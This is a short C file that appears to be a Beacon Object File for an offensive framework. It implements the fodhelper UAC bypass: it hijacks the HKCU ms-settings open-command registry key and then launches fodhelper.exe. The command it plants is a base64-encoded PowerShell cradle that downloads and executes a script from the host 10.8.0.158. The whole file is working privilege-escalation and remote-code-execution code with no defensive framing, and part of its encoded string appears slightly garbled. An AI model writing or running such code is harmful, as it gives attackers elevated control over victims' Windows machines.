#include <windows.h>
#include "beacon.h"

void go() {
    HKEY hKey;
    LPCSTR regPath = "Software\\Classes\\ms-settings\\shell\\open\\command";
    LPCSTR delegate = "DelegateExecute";
    LPCSTR payload = "powershell.exe -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0AQwBvAG0AbQBhAG4AZAAgACIAaQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgA4AC4AMAAuADEANQA4AC8AbwBzAG0AYu4AcABzADEAJwApACkAIgA=";

    
    if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)payload, strlen(payload));
        RegSetValueExA(hKey, delegate, 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);
    }

   
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOWNORMAL);
}
